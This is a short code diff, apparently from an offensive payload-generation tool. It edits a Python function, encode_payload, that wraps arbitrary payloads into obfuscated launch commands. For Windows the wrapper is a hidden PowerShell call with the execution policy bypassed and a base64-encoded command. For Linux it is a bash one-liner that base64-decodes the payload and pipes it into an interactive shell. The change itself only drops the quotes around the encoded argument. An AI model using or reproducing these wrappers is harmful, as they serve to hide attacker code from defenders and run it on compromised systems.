@@ -34,7 +34,7 @@ def encode_payload(payload, os_type, enc_type):
     res = ""
     if os_type == "windows":
         if enc_type == "powershell":
-            res = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand \"{}\"".format(b64encode(payload.encode('UTF-16LE')).decode('ascii'))
+            res = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {}".format(b64encode(payload.encode('UTF-16LE')).decode('ascii'))
     elif os_type == "linux":
         if enc_type == "shell":
             res = "bash -c \"{echo,%s}|{base64,-d}|{bash,-i}\"" % b64encode(payload.encode(encoding='ascii')).decode('ascii')
